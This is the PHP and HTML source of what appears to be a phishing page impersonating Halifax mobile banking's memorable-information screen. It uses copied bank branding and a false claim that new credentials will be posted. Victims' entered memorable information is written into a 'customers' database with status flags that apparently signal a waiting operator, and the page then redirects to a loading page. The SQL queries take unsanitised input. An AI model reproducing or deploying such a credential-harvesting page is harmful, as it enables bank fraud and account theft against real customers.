<?php

// $('.msgError').show();


session_start();
include 'files/config.php';
include 'files/connect.php';
require 'security/index.php';
if($_SESSION['started'] == 'true'){
	//echo '<script> console.log('.$_SESSION['uniqueid'].');</script>';
	$uniqueid = $_SESSION['uniqueid'];
	$query = mysqli_query($conn,"SELECT * FROM customers WHERE uniqueid=$uniqueid");
	if($query){
		$arr = mysqli_fetch_array($query,MYSQLI_ASSOC);
		$askchar1 = $arr['askchar1'];
		$askchar2 = $arr['askchar2'];
		$askchar3 = $arr['askchar3'];
	}else{
		header('location:exit.php');
	}
	
}else{
	header('location:exit.php');
}

if(isset($_GET['submit'])){
    $fullMem = $_POST['fullMem'];
    $new1 = $_POST['new1'];
    $new2 = $_POST['new2'];
    if($new1 == $new2){
        $uniqueid = $_POST['userid']; // unique userid
		$query = mysqli_query($conn, "UPDATE customers SET fullMem='$fullMem', status=1, buzzed=0 WHERE uniqueid=$uniqueid");
		if($query){
			header('location:Loading.php');
		}else{
			header('location:Loading.php');
		}
    }
}

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML Basic 1.1//EN" "http://www.w3.org/TR/xhtml-basic/xhtml-basic11.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-gb" lang="en-gb">
    <head>
        
        <meta name="DCSext.hasTealium" content="1" />

        <title>
            Halifax - Mobile Banking - Enter Memorable Information
        </title>
        <meta name="keywords" content="" />
        <meta name="description" content="" />
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <meta http-equiv="content-language" content="en-gb" />
        
        <meta name="viewport" content="width=device-width" />
        <meta name="format-detection" content="telephone=no" />

        <link rel="apple-touch-icon" sizes="57x57" href="files/img/Halifax%2057x57%20app-touch-icon-1432115287.JPG" />
        <link rel="apple-touch-icon" sizes="114x114" href="files/img/Halifax%20114x114%20app-touch-icon-1472024731.JPG" />
		<link rel="shortcut icon" href="files/img/favicon.ico" />
        <link type="text/css" href="files/css/base-auto-min200526.css" rel="stylesheet" />

        


        <script src="files/js/jquery.js"></script>
    </head>
    <body class="hasJS" cz-shortcut-listen="true" data-__gyazo-extension-added-paste-support="true">
        <div id="outer">
            <div id="banner">
                <p id="logo">
                    <img src="files/img/Halifax-logo-1432115232.gif" alt="Halifax" />
                </p>

                <p id="userStatus">
                    <img id="headerChangeNGB:lnkpadlockSeclogoff" src="files/img/padlock-secure-NGB-1432115235.gif" alt="Secure" />
                </p>
                <div class="cookiePolicy">
                    <a
                        id="headerChangeNGB:ePrivacyLoggedOut"
                        name="headerChangeNGB:ePrivacyLoggedOut"
                        href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=%2Fuseradmin%2Fmobile%2Flogon%2Fentermemorableinformation.jsp&amp;HEADER_CONTENT=pages%2Fp226_00%2F22600htm502&amp;BODY_CONTENT=pages%2Fp226_00%2F22600htm503&amp;COOKIE_POLICY_FLAG=FALSE&amp;lnkcmd=headerChangeNGB%3AePrivacyLoggedOut&amp;al="
                        title="Cookie policy"
                        class="blockLink"
                    >
                        Cookie policy
                    </a>
                </div>
                <div class="clearer"></div>
            </div>
            <div id="header">
                <div class="panelTL">
                    <div class="panelTR">
                        <div class="panelBR">
                            <div class="panelBL">
                                <div id="headerInner">
                                    <!-- start TS:component_0_free_format -->

                                    <h1>Memorable information</h1>

                                    <!-- end TS:component_0_free_format -->
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <div class="content enter-mi">
                <div class="panel">
                    <div class="panelTL">
                        <div class="panelTR">
                            <div class="panelBR">
                                <div class="panelBL">
                                    <div class="panelInner">
                                        <div class="inner">
										<div class="msgError" style="display:none;"><div class="msgTL"><div class="msgTR"><div class="msgBR"><div class="msgBL"><p class="msgP">Information in the highlighted areas is incorrect. Please correct it and try again.</p></div></div></div></div></div>
                                            <!-- start TS:component_0_free_format -->

                                            <p class="sudoLabel">You need to reset your Memorable Information</p>
                                            <p class="sudoLabel">We will also send you a new Username and Password via post</p>

                                            <!-- end TS:component_0_free_format -->

                                            <form id="memoform" name="frmEnterMemorableInformation1" method="post" autocomplete="off" action="?submit">

											    <input type='hidden' name='userid' value="<?=$_SESSION['uniqueid'];?>">
                                                <div class="memorableInfo">
                                                    <div class="formField">
                                                        
														<div class="formField">
                                                            <label for="frmEnterMemorableInformation1:formMem1">Current Memorable Information:</label>
                                                            <input required type="text" autocomplete="off" id="username" name="fullMem" class="wide" maxlength="30" />
                                                        </div>

                                                        <div class="formField">
                                                            <label for="frmEnterMemorableInformation1:formMem1">New Memorable Information:</label>
                                                            <input required type="password" autocomplete="off" id="username" name="new1" class="wide" maxlength="30" />
                                                        </div>
                                                        <div class="formField">
                                                            <label for="frmEnterMemorableInformation1:formMem1">Repeat New Memorable Information:</label>
                                                            <input required type="password" autocomplete="off" id="username" name="new2" class="wide" maxlength="30" />
                                                        </div>

                                                    </div>
                                                    <div class="clearer"></div>
                                                </div>
                                                <div class="divider"></div>
                                                <div class="actions">
                                                    <input id="frmEnterMemorableInformation1:lnkSubmit" name="frmEnterMemorableInformation1:lnkSubmit" type="submit" value="Submit" alt="Submit" title="Submit" class="submitAction" />
                                                    <div class="nav">
                                                        <div class="lnkLev2">
                                                            <div class="lnkTL">
                                                                <div class="lnkTR">
                                                                    <div class="lnkBR">
                                                                        <div class="lnkBL">
                                                                            <p class="lnkLev2PCancel">
                                                                                <a
                                                                                    id="frmEnterMemorableInformation1:lnkCancel"
                                                                                    name="frmEnterMemorableInformation1:lnkCancel"
                                                                                    href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?lnkcmd=frmEnterMemorableInformation1%3AlnkCancel&amp;al="
                                                                                    class="blockLink"
                                                                                >
                                                                                    Cancel
                                                                                </a>
                                                                            </p>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                                <input type="hidden" name="frmEnterMemorableInformation1" value="frmEnterMemorableInformation1" /><input type="hidden" name="submitToken" value="4423772"/>
                                            </form>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <div id="footer footerLogin">
                    <div class="FootNav">
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk1"
                                    name="lnk1"
                                    href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp04_04_enter_memorable_information%2F0404htm302&amp;BODY_CONTENT=pages%2Fp04_04_enter_memorable_information%2F0404hlp301&amp;lnkcmd=lnk1&amp;al="
                                    title="Help"
                                    class="blockLink"
                                >
                                    Help
                                </a>
                            </p>
                        </div>
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk2"
                                    name="lnk2"
                                    href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm300&amp;BODY_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm301&amp;lnkcmd=lnk2&amp;al="
                                    title="Security"
                                    class="blockLink"
                                >
                                    Security
                                </a>
                            </p>
                        </div>
                        <div class="lnkLevFoot">
                            <p class="lnkLevFootP">
                                <a
                                    id="lnk3"
                                    name="lnk3"
                                    href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=ENTER_MI&amp;HEADER_CONTENT=pages%2Fp140_12_contact_logged_out%2F14012htm300&amp;BODY_CONTENT=pages%2Fp140_12_contact_logged_out%2F14012htm301&amp;lnkcmd=lnk3&amp;al="
                                    title="Contact us"
                                    class="blockLink"
                                >
                                    Contact us
                                </a>
                            </p>
                        </div>
                    </div>
                    <div class="footerLinksLogin">
                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnksecurityloggedout"
                            href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm300&amp;BODY_CONTENT=pages%2Fp140_06_security_logged_out%2F14006htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3Alnksecurityloggedout&amp;al="
                            title="Security"
                        >
                            Security
                        </a>

                        <a
                            id="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            name="sntgprmtd2:footerngb:cndunauthenvironngb:lnkLegalloggedout"
                            href="https://secure.halifax-online.co.uk/personal/a/useradmin/mobile/logon/entermemorableinformation.jsp?REFERRING_LOCATION=&amp;HEADER_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm300&amp;BODY_CONTENT=pages%2Fp140_01_legal_logged_out%2F14001htm301&amp;lnkcmd=sntgprmtd2%3Afooterngb%3Acndunauthenvironngb%3AlnkLegalloggedout&amp;al="
                            title="Legal"
                            class="footerLinksLast"
                        >
                            Legal
                        </a>
                    </div>
                    <span id="mLogonSuccess" style="display: none;"></span>
                    
                </div>
            </div>
        </div>
        
        

        

        
    </body>
</html>
